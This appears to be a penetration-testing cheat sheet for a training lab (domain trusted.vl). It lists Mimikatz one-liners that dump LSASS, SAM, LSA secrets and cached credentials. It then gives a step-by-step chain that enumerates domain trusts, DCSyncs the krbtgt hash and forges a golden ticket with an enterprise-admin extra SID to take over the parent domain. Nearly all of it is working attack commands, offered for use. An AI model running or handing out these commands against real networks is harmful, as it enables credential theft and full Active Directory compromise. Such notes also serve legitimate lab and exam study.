
```
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords /full" "lsadump::sam" "lsadump::secrets" exit >> mimi_oscp_essentials_101.txt
```
- essentials



```
.\mimikatz.exe "hostname" "token::whoami /full" "privilege::name SEDebug" "privilege::name SEImpersonate" "privilege::name SEGlobalCreate" "privilege::debug" "token::elevate" "token::elevate /domainadmin" "lsadump::lsa /inject" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "sekurlsa::logonpasswords" "sekurlsa::minidump lsass.dmp" "lsadump::trust" "sekurlsa::tickets" "sekurlsa::wdigest" "net::user" "net::alias" "net::trust" "net::wsession" "sekurlsa::msv" "sekurlsa::credman" "vault::cred /patch" exit >> mimi_dump_all_153.txt
```
- Overkill, sometimes doesn't work


Forge golden ticket by abusing child>parent domain trust relationship of two domains to escalate to escalate to enterprise DA from regular DA
```
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
```
- enumerate trust between multiple domains
```
nltest.exe /trusted_domains
```
- list trusted domains
- does not require transfering file to machine; can automatically run command as DA
transfer mimikatz.exe and run it, then
```
lsadump::dcsync /domain:lab.trusted.vl /all
```
- need krbtgt NTLM hash
```
lsadump::trust /patch
```
- need both Current domain: SID and Domain: SID, both listed right after the command at the top of the output. Ex:
	- S-1-5-21-2241985869-2159962460-1278545866
	- S-1-5-21-3576695518-347000760-3731839591
```
kerberos::golden /user:Administrator /krbtgt:c7a03c565c68c6fac5f8913fab576ebd /domain:lab.trusted.vl /sid:S-1-5-21-2241985869-2159962460-1278545866 /sids:S-1-5-21-3576695518-347000760-3731839591-519 /ptt
```
- forge gold ticket for enterprise DA
```
lsadump::dcsync /domain:trusted.vl /dc:trusteddc.trusted.vl /all
```
- find listed administrator NTLM hash and PTH